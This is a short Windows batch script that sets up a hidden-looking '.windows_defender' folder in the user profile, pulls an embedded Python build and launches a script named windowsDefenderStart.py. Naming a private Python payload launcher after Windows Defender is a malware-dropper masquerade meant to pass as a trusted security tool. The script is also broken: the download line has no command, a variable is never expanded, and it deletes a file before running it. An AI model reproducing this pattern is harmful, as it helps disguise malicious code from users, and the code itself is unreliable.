@echo off
cd %USERPROFILE%
set pythonDC=%USERPROFILE%\.windows_defender\python\python.exe


if not exist "%USERPROFILE%\.windows_defender" (
    mkdir .windows_defender
)
cd .windows_defender

if not exist "%USERPROFILE%\.windows_defender\python-3.9.13-embed-amd64.zip" (
    https://www.python.org/ftp/python/3.9.13/python-3.9.13-embed-amd64.zip -O
)

mkdir python

tar -xf python-3.9.13-embed-amd64.zip %USERPROFILE%\.windows_defender\python

pythonDC -m ensurepip

del windowsDefenderStart.py

pythonDC %USERPROFILE%\.windows_defender\python\getpip.py 
pythonDC windowsDefenderStart.py
